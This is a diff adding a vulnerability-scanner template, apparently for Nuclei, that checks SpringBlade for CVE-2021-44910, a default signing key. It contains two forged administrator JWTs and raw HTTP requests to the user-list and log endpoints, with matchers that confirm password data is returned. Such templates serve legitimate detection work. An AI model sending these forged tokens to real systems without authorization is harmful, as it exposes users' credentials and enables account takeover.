@@ -1,0 +1,51 @@
+id: cve-2021-44910
+info:
+  name: SpringBlade Default SIGN_KEY Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SpringBlade framework has a default SIGN_KEY, allowing attackers to potentially obtain sensitive user information like account passwords.
+  reference:
+    - https://github.com/chillzhuang/blade-tool
+    - https://forum.butian.net/share/973
+
+variables:
+  token1: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSJ9.-XHkGTDfmGOdB8DNKwcCgWIfcR8Ln4hs09CVDslv1ATodR2Mjmjrq6KCysoK-sw3zf2EwATzdgxGXNGxfmj9wg
+  token2: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ
+
+http:
+  - raw:
+      - |
+        GET /api/blade-user/user-list HTTP/1.1
+        Host: {{Hostname}}
+        Blade-Auth: bearer {{token1}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"code":200'
+          - 'password'
+
+  - raw:
+      - |
+        GET /api/blade-user/user-list HTTP/1.1
+        Host: {{Hostname}}
+        Blade-Auth: bearer {{token2}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"code":200'
+          - 'password'
+
+  - raw:
+      - |
+        GET /api/blade-log/api/list HTTP/1.1
+        Host: {{Hostname}}
+        Blade-Auth: bearer {{token1}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"code":200'
+          - 'params'
